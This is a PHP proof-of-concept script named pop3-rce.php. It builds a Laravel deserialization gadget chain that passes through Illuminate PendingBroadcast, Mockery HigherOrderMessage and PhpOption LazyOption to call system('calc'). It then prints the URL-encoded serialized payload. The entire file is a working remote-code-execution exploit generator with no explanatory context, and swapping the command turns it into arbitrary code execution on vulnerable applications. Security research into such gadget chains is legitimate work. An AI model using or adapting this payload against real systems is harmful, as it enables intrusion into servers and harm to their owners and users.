<?php
/*
# -*- coding: utf-8 -*-
# @filename: pop3-rce.php
# @author: diggid
*/
namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}
namespace Mockery {
    class HigherOrderMessage{
        private $mock;
        private $method;
        public function __construct($a, $b)
        {
            $this->mock = $a;
            $this->method = $b;
        }
    }
}

namespace PhpOption{
    final class LazyOption{
        private $callback;
        private $arguments;
        private $option;

        public function __construct($callback, $arguments, $option)
        {
            $this->callback = $callback;
            $this->arguments = $arguments;
            $this->option = $option;
        }
    }
}
namespace {
    $a = new PhpOption\LazyOption("system", array("calc"), null);
    $b = new Mockery\HigherOrderMessage($a, "filter");
    $c = new Illuminate\Broadcasting\PendingBroadcast($b, "diggid");
    echo urlencode(serialize($c));
}
